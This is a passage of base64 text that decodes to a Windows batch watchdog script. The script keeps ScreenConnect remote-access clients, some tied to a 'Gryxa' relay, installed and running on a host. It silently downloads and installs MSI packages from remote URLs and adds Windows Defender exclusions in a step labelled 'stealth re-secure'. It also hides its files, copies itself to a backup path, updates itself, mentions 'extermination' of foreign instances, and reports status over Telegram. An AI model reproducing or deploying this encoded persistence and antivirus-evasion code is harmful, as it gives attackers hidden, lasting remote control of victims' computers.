ZW1vdmFsKSBjYW4gTkVWRVIgc3RhcnQuIERlbGV0ZSBpdCBhbmQgZmFsbCB0aHJvdWdoIHRvIHRo
ZQ0KcmVtIGZyZXNoLWluc3RhbGwgbGFkZGVyIGJlbG93IGluc3RlYWQgb2YgYWxlcnRpbmcgIndv
bnQgc3RhcnQiIGZvcmV2ZXIuDQppZiAiJUlOU1RBTExFRCUiPT0iMSIgaWYgIiVQUklNX09LJSI9
PSIwIiAoDQogIHNldCAiUkVHU1RBVEU9dW5rbm93biINCiAgaWYgZXhpc3QgIiVXRCVcb3duX2xp
Yi5wczEiIGZvciAvZiAiZGVsaW1zPSIgJSVSIGluICgncG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1O
b25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGli
LnBzMSIgLUFjdGlvbiByZWdpc3RlcmVkIC1GcCAiJUtFRVBfRlAlIiAtV29ya0RpciAiJVdEJSIn
KSBkbyBzZXQgIlJFR1NUQVRFPSUlUiINCiAgZWNobyBvcnBoYW5fY2hlY2s9IVJFR1NUQVRFIT4+
IiVMT0clIg0KICBpZiAvSSAiIVJFR1NUQVRFISI9PSJubyIgKA0KICAgIGVjaG8gb3JwaGFuX3Nl
cnZpY2VfZGVsZXRlPj4iJUxPRyUiDQogICAgc2MgZGVsZXRlICJTY3JlZW5Db25uZWN0IENsaWVu
dCAoJUtFRVBfRlAlKSIgPm51bCAyPiYxDQogICAgc2V0ICJJTlNUQUxMRUQ9MCINCiAgKQ0KKQ0K
aWYgIiVJTlNUQUxMRUQlIj09IjEiIGlmICIlUFJJTV9PSyUiPT0iMCIgKA0KICBwb3dlcnNoZWxs
IC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxl
ICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHN0YXRlIC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQg
JU1PTlZFUiUgLUV4dHJhICJzdmMtd29udC1zdGFydCIgPm51bCAyPiYxDQogIGNhbGwgOlRnU3Rh
dGUgRE9XTiAiU2NyZWVuQ29ubmVjdCAoJUtFRVBfRlAlKSBpbnN0YWxsZWQgYnV0IHdvbnQgc3Rh
cnQiDQogIGdvdG8gOkFmdGVySGVhbA0KKQ0KaWYgIiVJTlNUQUxMRUQlIj09IjEiIGdvdG8gOkFm
dGVySGVhbA0KDQpyZW0g4pSA4pSAIFtEXSBwcmltYXJ5IFNDIG1pc3NpbmcgLSBoZWFsIGxhZGRl
ciDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
lIDilIDilIDilIANCnJlbSBNMTI6IEZJUlNUIHJlcGFpciB0aGUgcmVnaXN0ZXJlZCBwcm9kdWN0
IChyZWNyZWF0ZXMgc2VydmljZSB3aXRob3V0DQpyZW0gdG91Y2hpbmcgdGhlIEFMVCBpbnN0YW5j
ZSk7IGZyZXNoIG1zaWV4ZWMgaW5zdGFsbCBvbmx5IGFzIGZhbGxiYWNrLg0KZWNobyBzdmMgbWlz
c2luZyAtIGhlYWwgYmVnaW4+PiIlTE9HJSINCmNhbGwgOlJlcGFpclJlZ2lzdGVyZWQgIiVLRUVQ
X0ZQJSINCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgfCBmaW5k
ICJSVU5OSU5HIiA+bnVsDQppZiBub3QgZXJyb3JsZXZlbCAxICgNCiAgc2V0ICJJTlNUQUxMRUQ9
MSINCiAgc2V0ICJQUklNX09LPTEiDQogIGdvdG8gOkFmdGVySGVhbA0KKQ0KcmVtIHJlZnVzZSBm
cmVzaCAvaSBpZiBwcm9kdWN0IHN0aWxsIHJlZ2lzdGVyZWQgLSBVcGdyYWRlIHRhYmxlIGNhbiB3
aXBlIEFMVC9HUllYQQ0Kc2V0ICJSRUdTVEFURT11bmtub3duIg0KaWYgZXhpc3QgIiVXRCVcb3du
X2xpYi5wczEiIGZvciAvZiAidXNlYmFja3EgZGVsaW1zPSIgJSVSIGluIChgcG93ZXJzaGVsbCAt
Tm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAi
JVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiByZWdpc3RlcmVkIC1GcCAiJUtFRVBfRlAlIiAtV29y
a0RpciAiJVdEJSJgKSBkbyBzZXQgIlJFR1NUQVRFPSUlUiINCmlmIC9JICIhUkVHU1RBVEUhIj09
InllcyIgKA0KICBlY2hvIHByaW1hcnlfcmVnaXN0ZXJlZF9za2lwX2ZyZXNoX2luc3RhbGw+PiIl
TE9HJSINCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9u
UG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBzdGF0ZSAtV29y
a0RpciAiJVdEJSIgLUJ1aWxkICVNT05WRVIlIC1FeHRyYSAicmVnaXN0ZXJlZC1zdHVjayIgPm51
bCAyPiYxDQogIGNhbGwgOlRnU3RhdGUgRE9XTiAiUHJpbWFyeSByZWdpc3RlcmVkIGJ1dCBzZXJ2
aWNlIG1pc3NpbmcgLSAvZmEgZmFpbGVkOyByZWZ1c2VkIC9pIHRvIHByb3RlY3QgQUxUL0dSWVhB
Ig0KICBnb3RvIDpBZnRlckhlYWwNCikNCnJlbSBPMzc6IHJlZnVzZSBzZXZyeiAvaSB3aGVuIGdy
eXhhIGFscmVhZHkgcHJlc2VudCDigJQgc2hhcmVkIGxlZ2FjeSBVcGdyYWRlQ29kZXMNCnJlbSB7
MEM5NDQ0OEJ9L3sxRjg1RDdGRX0gbWFrZSBzaWJsaW5nIG1zaWV4ZWMgL2kga25vY2sgR3J5eGEg
T0ZGTElORSBpbiBwYW5lbC4NCnNldCAiR1JFRz11bmtub3duIg0KaWYgZXhpc3QgIiVXRCVcb3du
X2xpYi5wczEiIGZvciAvZiAidXNlYmFja3EgZGVsaW1zPSIgJSVSIGluIChgcG93ZXJzaGVsbCAt
Tm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAi
JVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiByZWdpc3RlcmVkIC1GcCAiJUdSWVhBX0ZQJSIgLVdv
cmtEaXIgIiVXRCUiYCkgZG8gc2V0ICJHUkVHPSUlUiINCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0
IENsaWVudCAoJUdSWVhBX0ZQJSkiID5udWwgMj4mMQ0KaWYgbm90IGVycm9ybGV2ZWwgMSBzZXQg
IkdSRUc9eWVzIg0KaWYgL0kgIiFHUkVHISI9PSJ5ZXMiICgNCiAgZWNobyBwcmltYXJ5X3NraXBf
aV9wcm90ZWN0X2dyeXhhPj4iJUxPRyUiDQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50
ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEi
IC1BY3Rpb24gc3RhdGUgLVdvcmtEaXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVSJSAtRXh0cmEgInBy
b3RlY3QtZ3J5eGEtc2tpcC1wcmltYXJ5LWkiID5udWwgMj4mMQ0KICBjYWxsIDpUZ1N0YXRlIERP
V04gIlByaW1hcnkgbWlzc2luZyAtIHJlZnVzZWQgc2V2cnogL2kgdG8gcHJvdGVjdCBHcnl4YSAo
c2hhcmVkIFNDIFVwZ3JhZGVDb2Rlcyk7IC9mYSBvbmx5Ig0KICBnb3RvIDpBZnRlckhlYWwNCikN
CmlmICIlSU5TVEFMTEVEJSI9PSIwIiBjYWxsIDpJbnN0YWxsTXNpICIlTVNJX1VSTCUiICJtYWlu
Ig0KaWYgIiVJTlNUQUxMRUQlIj09IjAiIGNhbGwgOkluc3RhbGxNc2kgIiVNU0lfUEtHMSU/dD0l
UkFORE9NJSIgImdpdGh1Yi1wa2ciDQppZiAiJUlOU1RBTExFRCUiPT0iMCIgY2FsbCA6SW5zdGFs
bE1zaSAiJU1TSV9QS0cyJSIgImpzZGVsaXZyLXBrZyINCmlmICIlSU5TVEFMTEVEJSI9PSIwIiAo
DQogIHJlbSBwcmVmZXIgd29ya2VyLWNhY2hlZCAud3VjYWNoZVxwa2cubXNpIChzYW1lIGJpbmFy
eSBhcyBkZXBsb3kpDQogIGF0dHJpYiAtaCAtcyAtciAiJU1TSUNBQ0hFJSIgPm51bCAyPiYxDQog
IGZvciAlJUYgaW4gKCIlTVNJQ0FDSEUlIikgZG8gaWYgJSV+ekYgR1RSIDEwMDAwMDAgKA0KICAg
IGVjaG8gd3VjYWNoZV9wa2dfcmV0cnk+PiIlTE9HJSINCiAgICBhdHRyaWIgLWggLXMgLXIgIiVN
U0klIiA+bnVsIDI+JjENCiAgICBjb3B5IC95ICIlTVNJQ0FDSEUlIiAiJU1TSSUiID5udWwgMj4m
MQ0KICApDQogIGZvciAlJUYgaW4gKCIlTVNJJSIpIGRvIGlmICUlfnpGIEdUUiAxMDAwMDAwICgN
CiAgICBlY2hvIGNhY2hlIHJldHJ5IGluc3RhbGw+PiIlTE9HJSINCiAgICBjYWxsIDpOb01zaVBv
bGljeQ0KICAgIG1zaWV4ZWMgL2kgIiVNU0klIiAvcW4gL25vcmVzdGFydCBBTExVU0VSUz0xIFJF
Qk9PVD1SZWFsbHlTdXBwcmVzcyAvTCp2ICIlV0QlXG1zaV9oZWFsLmxvZyIgPm51bCAyPiYxDQog
ICAgc2V0ICJNU0lFWElUPSFFUlJPUkxFVkVMISINCiAgICBlY2hvIGNhY2hlIG1zaWV4ZWMgZXhp
dD0hTVNJRVhJVCE+PiIlTE9HJSINCiAgICBpZiAiIU1TSUVYSVQhIj09IjE2MTgiICgNCiAgICAg
IHRpbWVvdXQgL3QgMzAgL25vYnJlYWsgPm51bA0KICAgICAgbXNpZXhlYyAvaSAiJU1TSSUiIC9x
biAvbm9yZXN0YXJ0IEFMTFVTRVJTPTEgUkVCT09UPVJlYWxseVN1cHByZXNzIC9MKnYgIiVXRCVc
bXNpX2hlYWwyLmxvZyIgPm51bCAyPiYxDQogICAgICBzZXQgIk1TSUVYSVQ9IUVSUk9STEVWRUwh
Ig0KICAgICAgZWNobyBjYWNoZV9yZXRyeTE2MThfZXhpdD0hTVNJRVhJVCE+PiIlTE9HJSINCiAg
ICApDQogICAgY2FsbCA6V2FpdFN2Yw0KICApDQopDQpjYWxsIDpSZXN0b3JlQWx0DQpjYWxsIDpF
bnN1cmVHcnl4YU11c3QNCmlmICIlSU5TVEFMTEVEJSI9PSIwIiAoDQogIGlmIGV4aXN0ICIlV0Ql
XG1zaV9oZWFsLmxvZyIgKA0KICAgIGVjaG8gLS0tIG1zaV9oZWFsLmxvZyB0YWlsIC0tLT4+IiVM
T0clIg0KICAgIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUNvbW1hbmQg
IkdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAnJVdEJVxtc2lfaGVhbC5sb2cnIC1UYWlsIDEwIiA+
PiIlTE9HJSIgMj4mMQ0KICApDQogIGlmIG5vdCBkZWZpbmVkIE1TSUVYSVQgc2V0ICJNU0lFWElU
PWZldGNoLWZhaWwiDQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4
ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gc3Rh
dGUgLVdvcmtEaXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVSJSAtRXh0cmEgIm1zaS1mYWlsZWQiID5u
dWwgMj4mMQ0KICBjYWxsIDpUZ1N0YXRlIEZBSUwgIk1TSSBpbnN0YWxsIGZhaWxlZCBvbiBhbGwg
c291cmNlcyAobXNpZXhlYyBleGl0ICVNU0lFWElUJSkiDQopIGVsc2UgKA0KICBlY2hvIHN2YyBy
ZXN0b3JlZD4+IiVMT0clIg0KICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZl
IC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9u
IHN0YXRlIC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQgJU1PTlZFUiUgLUV4dHJhICJyZXN0b3JlZCIg
Pm51bCAyPiYxDQogIGNhbGwgOlRnU3RhdGUgUkVTVE9SRUQgIlNjcmVlbkNvbm5lY3QgcmVpbnN0
YWxsZWQgT0siDQopDQoNCjpBZnRlckhlYWwNCnJlbSBNMTY6IEFMVCBwcmVzZW50LWJ1dC1zdG9w
cGVkIC0+IHJlc3RhcnQsIHRoZW4gcmVwYWlyLWJ5LUdVSUQgKGV2ZXJ5IHRpY2spDQpzYyBxdWVy
eSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgPm51bCAyPiYxDQppZiBub3QgZXJy
b3JsZXZlbCAxICgNCiAgc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglQUxUX0ZQJSki
IHwgZmluZCAiUlVOTklORyIgPm51bA0KICBpZiBlcnJvcmxldmVsIDEgKA0KICAgIGVjaG8gYWx0
IHN0b3BwZWQgLSByZXN0YXJ0L3JlcGFpcj4+IiVMT0clIg0KICAgIG5ldCBzdGFydCAiU2NyZWVu
Q29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgPm51bCAyPiYxDQogICAgc2Mgc3RhcnQgIlNjcmVl
bkNvbm5lY3QgQ2xpZW50ICglQUxUX0ZQJSkiID5udWwgMj4mMQ0KICAgIHRpbWVvdXQgL3QgNSAv
bm9icmVhayA+bnVsDQogICAgc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglQUxUX0ZQ
JSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0KICAgIGlmIGVycm9ybGV2ZWwgMSBpZiBleGlzdCAi
JVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAt
RXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBy
ZXBhaXIgLUZwICIlQUxUX0ZQJSIgLVdvcmtEaXIgIiVXRCUiID4+IiVMT0clIiAyPiYxDQogICkN
CikNCnJlbSBNMTc6IEFMVCBzZXJ2aWNlIGVudHJ5IGRlbGV0ZWQgYnV0IHByb2R1Y3QgcmVnaXN0
ZXJlZCAtPiByZXBhaXItYnktR1VJRCBldmVyeSB0aWNrDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVj
dCBDbGllbnQgKCVBTFRfRlAlKSIgPm51bCAyPiYxDQppZiBlcnJvcmxldmVsIDEgKA0KICBlY2hv
IGFsdF9taXNzaW5nX3RyeV9yZXBhaXI+PiIlTE9HJSINCiAgaWYgZXhpc3QgIiVXRCVcb3duX2xp
Yi5wczEiIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBv
bGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gcmVwYWlyIC1GcCAi
JUFMVF9GUCUiIC1Xb3JrRGlyICIlV0QlIiA+PiIlTE9HJSIgMj4mMQ0KKQ0KcmVtIChleHRlcm1p
bmF0aW9uIGFscmVhZHkgcmFuIHByZS1oZWFsIGluIFtFXTsgZm9yZWlnbiBzdXJ2aXZvcnMgY291
bnRlZCB0aGVyZSkNCg0KcmVtIOKUgOKUgCBbRl0gc3RlYWx0aCByZS1zZWN1cmUgKHF1aWV0IERl
ZmVuZGVyIGV4Y2x1c2lvbiByZWZyZXNoKSDilIDilIANCnBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAt
Tm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUNvbW1hbmQgInRyeSB7IEFk
ZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJyVXRCUnLCclRVRMJScgLUVycm9yQWN0aW9u
IFN0b3AgfSBjYXRjaCB7fSIgPm51bCAyPiYxDQoNCnJlbSDilIDilIAgW0ddIHBlcmlvZGljIGZ1
bGwgcmUtc2VjdXJlIGV2ZXJ5IH4yIGgg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQpwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbklu
dGVyYWN0aXZlIC1Db21tYW5kICJpZigoVGVzdC1QYXRoICclV0QlXG93bl9zZWN1cmUuY21kJykg
LWFuZCAoKCAtbm90IChUZXN0LVBhdGggJyVXRCVcc2VjLmZsYWcnKSkgLW9yICgoKEdldC1EYXRl
KSAtIChHZXQtSXRlbSAtTGl0ZXJhbFBhdGggJyVXRCVcc2VjLmZsYWcnKS5MYXN0V3JpdGVUaW1l
KS5Ub3RhbEhvdXJzIC1nZSAyKSkpeyBleGl0IDEgfSBlbHNlIHsgZXhpdCAwIH0iID5udWwgMj4m
MQ0KaWYgZXJyb3JsZXZlbCAxICgNCiAgZWNobyBwZXJpb2RpYyByZS1zZWN1cmU+PiIlTE9HJSIN
CiAgY2FsbCAiJVdEJVxvd25fc2VjdXJlLmNtZCIgPj4iJUxPRyUiIDI+JjENCiAgZWNobyBkb25l
PiIlV0QlXHNlYy5mbGFnIg0KKQ0KDQpyZW0g4pSA4pSAIFtHMl0gR3J5eGEgTVVTVC1SVU4gKGxp
Z2h0IGV2ZXJ5IHRpY2sgKyBkZWVwIGV2ZXJ5IDhoKSDilIDilIDilIDilIANCnJlbSBEZWVwOiBk
b3dubG9hZCBNU0ksIGRldGVjdCBGUCBkcmlmdCwgVENQIHRvIHVwZGF0ZS91aS5ncnl4YS5jb20s
DQpyZW0gc2VydmljZStkaXIrcmVsYXkgY29uZmlnOyByZWluc3RhbGwgdW50aWwgSEVBTFRIWS4N
CnNldCAiR1JZWEFfT0s9MCINCnNldCAiR1JZWEFfV0FTPTAiDQppZiBleGlzdCAiJVdEJVxncnl4
YS5jZmciIGZvciAvZiAidXNlYmFja3EgdG9rZW5zPTEsKiBkZWxpbXM9PSIgJSVLIGluICgiJVdE
JVxncnl4YS5jZmciKSBkbyBpZiAvSSAiJSVLIj09IkNVUlJFTlRfRlAiIHNldCAiR1JZWEFfRlA9
JSVMIg0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglR1JZWEFfRlAlKSIgfCBmaW5k
ICJSVU5OSU5HIiA+bnVsDQppZiBub3QgZXJyb3JsZXZlbCAxIHNldCAiR1JZWEFfV0FTPTEiDQoN
CnNldCAiRE9fREVFUD0wIg0KcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAt
Q29tbWFuZCAiaWYoKCAtbm90IChUZXN0LVBhdGggJyVHUllYQV9ERUVQJScpKSAtb3IgKCgoR2V0
LURhdGUpLShHZXQtSXRlbSAtTGl0ZXJhbFBhdGggJyVHUllYQV9ERUVQJScgLUZvcmNlKS5MYXN0
V3JpdGVUaW1lKS5Ub3RhbEhvdXJzIC1nZSA4KSl7IGV4aXQgMSB9IGVsc2UgeyBleGl0IDAgfSIg
Pm51bCAyPiYxDQppZiBlcnJvcmxldmVsIDEgc2V0ICJET19ERUVQPTEiDQoNCmlmICIlRE9fREVF
UCUiPT0iMSIgKA0KICBlY2hvIGdyeXhhX2RlZXBfYmVnaW4+PiIlTE9HJSINCiAgc2V0ICJHUkVT
PSINCiAgaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIGZvciAvZiAidXNlYmFja3EgZGVsaW1z
PSIgJSVSIGluIChgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0
aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBncnl4YS1l
bnN1cmUgLURlZXAgLVdvcmtEaXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVSJWApIGRvIHNldCAiR1JF
Uz0lJVIiDQogIGVjaG8gZ3J5eGFfZGVlcF9yZXN1bHQ9IUdSRVMhPj4iJUxPRyUiDQogIGVjaG8g
IUdSRVMhfCBmaW5kc3RyIC9JICJIRUFMVEhZIiA+bnVsDQogIGlmIG5vdCBlcnJvcmxldmVsIDEg
KA0KICAgIHNldCAiR1JZWEFfT0s9MSINCiAgICBlY2hvIGRvbmU+IiVHUllYQV9ERUVQJSINCiAg
KSBlbHNlICgNCiAgICByZW0gZGVlcCBmYWlsZWQgLSBzdGlsbCB0cnkgbGlnaHQgbGFkZGVyLCBk
byBub3QgdG91Y2ggZGVlcCBmbGFnIChyZXRyeSBuZXh0IHRpY2tzKQ0KICAgIGNhbGwgOkVuc3Vy
ZUdyeXhhTXVzdA0KICApDQopIGVsc2UgKA0KICBpZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIg
KA0KICAgIHNldCAiR1JFUz0iDQogICAgZm9yIC9mICJ1c2ViYWNrcSBkZWxpbXM9IiAlJVIgaW4g
KGBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kg
QnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIGdyeXhhLWVuc3VyZSAtV29y
a0RpciAiJVdEJSIgLUJ1aWxkICVNT05WRVIlYCkgZG8gc2V0ICJHUkVTPSUlUiINCiAgICBlY2hv
IGdyeXhhX2xpZ2h0X3Jlc3VsdD0hR1JFUyE+PiIlTE9HJSINCiAgICBlY2hvICFHUkVTIXwgZmlu
ZHN0ciAvSSAiSEVBTFRIWSIgPm51bA0KICAgIGlmIG5vdCBlcnJvcmxldmVsIDEgKHNldCAiR1JZ
WEFfT0s9MSIpIGVsc2UgKGNhbGwgOkVuc3VyZUdyeXhhTXVzdCkNCiAgKSBlbHNlICgNCiAgICBj
YWxsIDpFbnN1cmVHcnl4YU11c3QNCiAgKQ0KKQ0KcmVtIHJlZnJlc2ggRlAgYWZ0ZXIgZW5zdXJl
IChtYXkgaGF2ZSByb3RhdGVkKQ0KaWYgZXhpc3QgIiVXRCVcZ3J5eGEuY2ZnIiBmb3IgL2YgInVz
ZWJhY2txIHRva2Vucz0xLCogZGVsaW1zPT0iICUlSyBpbiAoIiVXRCVcZ3J5eGEuY2ZnIikgZG8g
aWYgL0kgIiUlSyI9PSJDVVJSRU5UX0ZQIiBzZXQgIkdSWVhBX0ZQPSUlTCINCnNjIHF1ZXJ5ICJT
Y3JlZW5Db25uZWN0IENsaWVudCAoJUdSWVhBX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0K
aWYgbm90IGVycm9ybGV2ZWwgMSBzZXQgIkdSWVhBX09LPTEiDQoNCmlmICIlR1JZWEFfT0slIj09
IjEiIGlmICIlR1JZWEFfV0FTJSI9PSIwIiAoDQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9u
SW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5w
czEiIC1BY3Rpb24gc3RhdGUgLVdvcmtEaXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVSJSAtRXh0cmEg
ImdyeXhhLXJlc3RvcmVkIiA+bnVsIDI+JjENCiAgY2FsbCA6VGdTdGF0ZSBSRVNUT1JFRCAiR3J5
eGEgU2NyZWVuQ29ubmVjdCBoZWFsdGh5IChzdmMrZGlyK3JlbGF5KSINCikNCmlmICIlR1JZWEFf
T0slIj09IjAiICgNCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhl
Y3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBzdGF0
ZSAtV29ya0RpciAiJVdEJSIgLUJ1aWxkICVNT05WRVIlIC1FeHRyYSAiZ3J5eGEtbXVzdC1mYWls
IiA+bnVsIDI+JjENCiAgY2FsbCA6VGdTdGF0ZSBET1dOICJHcnl4YSBNVVNULVJVTiB1bmhlYWx0
aHkgLSByZWluc3RhbGwvcmVsYXkgY2hlY2sgZmFpbGVkIg0KKQ0KDQpyZW0g4pSA4pSAIFtIXSBx
dWlldCBkaWdlc3QgKHNraXAgaGVhbHRoeSBob3N0cyDigJQgd2FzIGZsb29kaW5nIFRlbGVncmFt
KSDilIDilIANCmlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBwb3dlcnNoZWxsIC1Ob1Byb2Zp
bGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93
bl9saWIucHMxIiAtQWN0aW9uIHN0YXRlIC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQgJU1PTlZFUiUg
Pm51bCAyPiYxDQpzZXQgIk5FRURfSEI9MCINCmlmICIlUFJJTV9PSyUiPT0iMCIgc2V0ICJORUVE
X0hCPTEiDQppZiAlRk9SRUlHTl9MRUZUJSBHVFIgMCBzZXQgIk5FRURfSEI9MSINCmlmICIlR1JZ
WEFfT0slIj09IjAiIHNldCAiTkVFRF9IQj0xIg0KaWYgIiVORUVEX0hCJSI9PSIwIiAoDQogIGVj
aG8gaGJfc2tpcF9oZWFsdGh5Pj4iJUxPRyUiDQopIGVsc2UgKA0KICBwb3dlcnNoZWxsIC1Ob1By
b2ZpbGUgLU5vbkludGVyYWN0aXZlIC1Db21tYW5kICJpZigoVGVzdC1QYXRoICclSEJGTEFHJScp
IC1hbmQgKE5ldy1UaW1lU3BhbiAtU3RhcnQgKEdldC1JdGVtIC1MaXRlcmFsUGF0aCAnJUhCRkxB
RyUnKS5MYXN0V3JpdGVUaW1lKS5Ub3RhbE1pbnV0ZXMgLWx0IDM2MCl7IGV4aXQgMCB9IGVsc2Ug
eyBleGl0IDEgfSIgPm51bCAyPiYxDQogIGlmIGVycm9ybGV2ZWwgMSAoDQogICAgZWNobyBoYj4l
SEJGTEFHJQ0KICAgIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1
dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcdGdfcmVwb3J0LnBzMSIgLVN0YXRlIEhCIC1N
b2RlIGNvbXBhY3QgLUJ1aWxkICVNT05WRVIlIC1Db3VudCAhQ09VTlQhID5udWwgMj4mMQ0KICAg
IGVjaG8gZGlnZXN0IEhCIHNlbnQ+PiIlTE9HJSINCiAgKQ0KKQ0KDQpyZW0g4pSA4pSAIFtJXSBz
ZWxmLXVwZGF0ZSBhcHBseSAobGFzdCB0aGluZyB0aGlzIHRpY2spIOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0KaWYgIiVTRUxGX1VQRCUiPT0iMSIgKA0KICBlY2hv
IHNlbGYtdXBkYXRlIGFwcGx5Pj4iJUxPRyUiDQogIGF0dHJpYiAtaCAtcyAtciAiJVdEJVxvd25f
bW9uLmNtZCIgPm51bCAyPiYxDQogIG1vdmUgL3kgIiVXRCVcb3duX21vbi5uZXh0IiAiJVdEJVxv
d25fbW9uLmNtZCIgPm51bCAyPiYxDQopDQpyZW0ga2VlcCBkdWFsLXBhdGggYmFja3VwIGluIHN5
bmMgZXZlcnkgdGljaw0KaWYgbm90IGV4aXN0ICIlRVRMJSIgbWtkaXIgIiVFVEwlIiA+bnVsIDI+
JjENCmlmIGV4aXN0ICIlV0QlXG93bl9tb24uY21kIiAoDQogIGF0dHJpYiAtaCAtcyAtciAiJUVU
TCVcZXRsX21vbi5jbWQiID5udWwgMj4mMQ0KICBjb3B5IC95ICIlV0QlXG93bl9tb24uY21kIiAi
JUVUTCVcZXRsX21vbi5jbWQiID5udWwgMj4mMQ0KKQ0KZGVsIC9mIC9xICIlTVVURVglIiA+bnVs
IDI+JjENCg0KZWNobyB0aWNrIGRvbmU6IHByaW09JVBSSU1fT0slIGdyeXhhPSVHUllYQV9PSyUg
YWx0PSVBTFRfT0slIGZvcmVpZ249JUZPUkVJR05fTEVGVCU+PiIlTE9HJSINCmVuZGxvY2FsDQpl
eGl0IC9iIDANCg0KcmVtIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkCBoZWxwZXJzIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kA0KOkVuc3VyZUdyeXhhTXVzdA0KcmVtIEdyeXhhIGlzIG1hbmRhdG9yeToga2VlcCBjbGltYmlu
ZyB1bnRpbCBzZXJ2aWNlIGlzIFJVTk5JTkcgKG9yIGxhZGRlciBleGhhdXN0ZWQpLg0Kc2V0ICJH
